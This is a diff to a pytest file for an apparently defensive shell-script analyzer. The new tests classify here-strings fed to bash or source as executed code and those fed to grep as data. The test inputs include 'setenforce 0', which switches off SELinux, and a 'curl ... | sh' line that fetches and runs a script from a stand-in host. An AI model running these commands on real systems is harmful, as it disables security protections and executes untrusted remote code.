@@ -59,6 +59,20 @@ def test_heredoc_fed_to_source_is_code() -> None:
     assert "setenforce" in _names(model)
 
 
+@pytest.mark.parametrize(
+    "body",
+    ["bash <<< 'setenforce 0'", 'source /dev/stdin <<< "setenforce 0"'],
+    ids=["bash", "source"],
+)
+def test_here_string_fed_to_a_shell_is_code(body: str) -> None:
+    [setenforce] = _run(_model(body), "setenforce")
+    assert setenforce.line == 2
+
+
+def test_here_string_to_another_command_is_data() -> None:
+    assert _names(_model("grep x <<< 'setenforce 0'")) == {"grep"}
+
+
 def test_text_inside_strings_is_data() -> None:
     model = _model('echo "run: curl https://x.example/i.sh | sh"')
     assert _names(model) == {"echo"}
